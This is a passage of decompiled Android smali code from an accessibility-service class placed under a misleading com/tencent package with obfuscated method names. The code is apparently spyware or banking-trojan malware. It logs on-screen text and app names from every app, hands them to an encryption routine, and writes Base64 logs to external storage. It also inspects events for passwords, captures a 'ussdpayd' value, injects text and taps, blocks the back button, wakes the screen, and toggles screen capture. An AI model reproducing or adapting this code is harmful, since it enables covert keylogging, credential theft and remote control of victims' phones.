    move-result-object v0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_16

    .line 849
    :goto_17
    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_1

    goto :goto_1a

    :cond_37
    :try_start_1c
    const-string v2, "SK"

    .line 853
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3a

    .line 854
    sget-object v0, Lcom/tencent/MainBackgroundService;->ifScreenShot:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_38

    const-string v0, "0"

    .line 855
    sput-object v0, Lcom/tencent/MainBackgroundService;->ifScreenShot:Ljava/lang/String;

    goto :goto_18

    .line 857
    :cond_38
    sput-object v13, Lcom/tencent/MainBackgroundService;->ifScreenShot:Ljava/lang/String;

    .line 862
    :goto_18
    sget-object v0, Lcom/tencent/MainBackgroundService;->ifScreenShot:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_39

    .line 863
    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$7;

    invoke-direct {v2, v1}, Lcom/tencent/AccessibilityServiceCore$7;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, v1, Lcom/tencent/AccessibilityServiceCore;->screenShotThread:Ljava/lang/Thread;

    .line 876
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_19

    .line 878
    :cond_39
    iget-object v0, v1, Lcom/tencent/AccessibilityServiceCore;->screenShotThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    const/4 v0, 0x0

    .line 879
    iput-object v0, v1, Lcom/tencent/AccessibilityServiceCore;->screenShotThread:Ljava/lang/Thread;
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_0

    :goto_19
    return-void

    :catch_0
    move-exception v0

    .line 890
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :catch_1
    :cond_3a
    :goto_1a
    return-void
.end method

.method public tunesxconcerningn1012SendMeHome()V
    .locals 2

    .line 140
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 141
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$1;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$1;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public tunesxconcerningn1012ShowActivite(Ljava/lang/Class;)Z
    .locals 1

    .line 3353
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p0, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p1, 0x10000000

    .line 3354
    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    const/high16 v0, 0x20000000

    .line 3355
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 3353
    invoke-virtual {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    const/4 p1, 0x0

    return p1
.end method

.method public tunesxconcerningn1012Treger()V
    .locals 2

    .line 1249
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 1250
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$15;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$15;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public tunesxconcerningn1012blockBack()V
    .locals 2

    .line 3065
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 3066
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$17;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$17;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public tunesxconcerningn1012click(II)V
    .locals 1

    .line 3314
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {p1, p2, v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public tunesxconcerningn1012pasteText()V
    .locals 4

    .line 1183
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x1

    .line 1184
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    .line 1189
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    const-string v2, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    .line 1190
    sget-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    const/high16 v2, 0x200000

    .line 1192
    invoke-virtual {v0, v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 1196
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_0

    return-void

    .line 1197
    :cond_0
    invoke-virtual {v0, v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_1
    const-string v0, ""

    .line 1199
    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    const/4 v0, 0x0

    .line 1200
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    return-void
.end method

.method public tunesxconcerningn1012sendlog(Landroid/view/accessibility/AccessibilityEvent;I)V
    .locals 13

    const-string v0, "#"

    const/4 v1, 0x3

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x1

    .line 3136
    :try_start_0
    sget-boolean v5, Lcom/tencent/MainBackgroundService;->k:Z

    if-eqz v5, :cond_5

    sget-boolean v5, Lcom/tencent/MainBackgroundService;->k_tunesxconcerningn1011_live:Z

    if-eqz v5, :cond_5

    if-eqz p1, :cond_5

    .line 3138
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_0

    .line 3139
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    if-ge v6, v4, :cond_1

    .line 3140
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    :cond_1
    if-eqz v5, :cond_4

    .line 3142
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    if-ge v6, v4, :cond_2

    goto/16 :goto_2

    .line 3145
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 3146
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    const-string v8, "null"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 3149
    :try_start_1
    sget-object v9, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-virtual {v9, v6}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v9

    const/16 v10, 0x18

    .line 3151
    invoke-virtual {p0, v9, v10, v10}, Lcom/tencent/AccessibilityServiceCore;->convertToBitmap(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v9

    .line 3152
    new-instance v10, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v10}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 3153
    sget-object v11, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v12, 0x32

    invoke-virtual {v9, v11, v12, v10}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 3154
    invoke-virtual {v10}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v9

    .line 3155
    invoke-static {v9, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v8
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 3165
    :catch_0
    :try_start_2
    invoke-virtual {v7, v6, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v6
    :try_end_2
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_0

    :catch_1
    move-object v6, v2

    :goto_0
    if-eqz v6, :cond_3

    .line 3170
    :try_start_3
    invoke-virtual {v7, v6}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v6

    goto :goto_1

    :cond_3
    sget-object v6, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v6, v6, v1

    :goto_1
    check-cast v6, Ljava/lang/String;

    .line 3171
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v9, v4

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/4 v10, 0x2

    aget-object v9, v9, v10

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v6, v6, v10

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v5, v5, v10

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "<0>"

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v6, "\t"

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-static {v5, v6}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_3

    :cond_4
    :goto_2
    return-void

    .line 3180
    :catch_2
    :cond_5
    :goto_3
    :try_start_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_6

    .line 3181
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    if-ge v6, v4, :cond_7

    .line 3182
    :cond_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    .line 3185
    :cond_7
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    .line 3186
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 3189
    :try_start_5
    invoke-virtual {v6, v4, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v2
    :try_end_5
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    :catch_3
    if-eqz v2, :cond_8

    .line 3194
    :try_start_6
    invoke-virtual {v6, v2}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v1

    goto :goto_4

    :cond_8
    sget-object v2, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v1, v2, v1

    :goto_4
    check-cast v1, Ljava/lang/String;

    .line 3195
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p0, p2}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012writeFile(Ljava/lang/String;)V

    .line 3197
    invoke-direct {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->checkPassword(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    return-void
.end method

.method tunesxconcerningn1012writeFile(Ljava/lang/String;)V
    .locals 9

    const-string v0, ".txt"

    const-string v1, "/Config/sys/apps/log"

    const-string v2, "log-"

    const-string v3, "/Config/sys/apps/log/log-"

    .line 3007
    invoke-direct {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->checkIfMatch(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v4, 0x7

    const/16 v5, 0xb

    .line 3008
    invoke-virtual {p1, v4, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    :cond_0
    :try_start_0
    const-string v4, "yyyy-MM-dd"

    .line 3015
    new-instance v5, Ljava/util/Date;

    invoke-direct {v5}, Ljava/util/Date;-><init>()V

    invoke-static {v4, v5}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;Ljava/util/Date;)Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 3017
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    .line 3018
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 3019
    new-instance v7, Ljava/io/File;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v7, v5, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 3022
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    .line 3023
    invoke-virtual {v6}, Ljava/io/File;->mkdirs()Z

    .line 3026
    :cond_1
    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_2

    .line 3027
    invoke-virtual {v7}, Ljava/io/File;->createNewFile()Z

    .line 3030
    :cond_2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012toBase64(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ">\r\n"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 3037
    new-instance v3, Ljava/io/File;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 3039
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    .line 3040
    invoke-virtual {v3}, Ljava/io/File;->createNewFile()Z

    .line 3043
    :cond_3
    new-instance v0, Ljava/io/FileOutputStream;

    const/4 v1, 0x1

    invoke-direct {v0, v3, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    .line 3044
    new-instance v1, Ljava/io/OutputStreamWriter;

    invoke-direct {v1, v0}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 3046
    invoke-virtual {v1, p1}, Ljava/io/OutputStreamWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 3047
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->flush()V

    .line 3048
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->close()V

    .line 3049
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    .line 3050
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public wakeupScreen()V
    .locals 5

    :try_start_0
    const-string v0, "power"

    .line 1207
    invoke-virtual {p0, v0}, Lcom/tencent/AccessibilityServiceCore;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 1208
    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "MyAccessibilityService:wakeLock"

    const v2, 0x3000001a

    .line 1210
    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    .line 1211
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 1214
    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$13;

    invoke-direct {v2, p0, v0}, Lcom/tencent/AccessibilityServiceCore$13;-><init>(Lcom/tencent/AccessibilityServiceCore;Landroid/os/PowerManager$WakeLock;)V

    const-wide/16 v3, 0x61a8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1222
    :catch_0
    new-instance v0, Lcom/tencent/AccessibilityServiceCore$14;

    invoke-direct {v0, p0}, Lcom/tencent/AccessibilityServiceCore$14;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    .line 1241
    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore$14;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :cond_0
    :goto_0
    return-void
.end method
